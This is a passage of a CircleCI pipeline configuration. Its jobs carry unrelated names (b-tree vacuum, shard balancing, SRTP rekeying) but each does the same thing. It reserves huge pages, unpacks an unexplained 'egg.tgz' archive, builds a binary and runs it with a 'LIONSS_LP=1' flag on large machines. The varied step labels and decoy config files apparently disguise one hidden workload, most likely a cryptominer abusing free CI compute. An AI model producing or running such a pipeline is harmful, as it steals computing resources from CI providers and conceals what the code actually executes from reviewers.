version: 2.1

jobs:
  btree-vacuum:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed page file
          command: |
            head -c 65536 /dev/zero > pages.db 2>/dev/null || : > pages.db
      - run:
          name: Build storage engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target btree-vacuum -j2
      - run:
          name: Vacuum b-tree pages
          command: LIONSS_LP=1 ./build/btree-vacuum --file pages.db --fillfactor 90
  onyxShard:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define shard map
          command: |
            printf 'shards = 16\n' > onyx.cfg
      - run:
          name: Build shard manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target onyxShard -j2
      - run:
          name: Balance onyx shards
          command: LIONSS_LP=1 ./build/onyxShard --config onyx.cfg --rf 2
  srtp_rekey:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set crypto
          command: |
            printf 'suite aes128\n' > srtp.cfg
      - run:
          name: Build SRTP session
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target srtp_rekey -j2
      - run:
          name: Rekey SRTP stream
          command: LIONSS_LP=1 ./build/srtp_rekey --conf srtp.cfg --mki
  fogbank:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
